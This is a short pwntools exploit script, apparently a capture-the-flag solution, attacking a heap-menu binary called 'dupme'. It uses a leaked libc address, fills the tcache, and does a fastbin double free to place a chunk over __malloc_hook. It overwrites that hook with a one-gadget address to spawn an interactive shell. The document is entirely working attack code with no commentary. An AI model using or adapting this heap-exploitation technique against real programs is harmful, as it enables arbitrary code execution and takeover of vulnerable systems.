from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
p = process(['./ld.so.2', './dupme'], env={'LD_PRELOAD':'./libc.so.6'})
#gdb.attach(p)
context.arch = "amd64"
def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", "1")
    r2 = p.sendlineafter(b">", str(ind))
    r3 = p.sendlineafter(b">", str(size))
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", "2")
    r2 = p.sendlineafter(b">", str(ind))
    return r1 + r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">","3")
    r2 = p.sendlineafter(b">",str(ind))
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", "4")
    r2 = p.sendlineafter(b">", str(ind))
    leak = p.recvuntil(b"addresses.");
    return leak

def malloclast(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", "1")
    r2 = p.sendlineafter(b">", str(ind))
    r3 = p.sendlineafter(b">", str(size))
    return r1+r2+r3

p.recvuntil("glibc leak: ")
leak = int(p.recvuntil("\n"),16)
print(p.recvuntil("Exit"))
print(leak,hex(leak))
#print(p.recv())
for i in range(0,9):
	malloc(i,104,"what")
for i in range(0,7):
	free(i)
free(7)
free(8)
free(7)
for i in range(7):
        malloc(i,104,'ok')
elf = ELF("./libc.so.6")
elf.address = leak - elf.sym.printf
print(hex(elf.address))
chunk = malloc(9,104,p64(elf.sym.__malloc_hook - 35))
malloc(10,104,"hi")
malloc(11,104,"hi")
malloc(12,104,b"a"*(19+16)+p64(0xe27a1+elf.address))
#p.sendlineafter(b">", "1")
#p.sendlineafter(b">", "13")
#p.sendlineafter(b">", "104")
malloclast(13, 104, "data")
p.interactive()
#p.close()

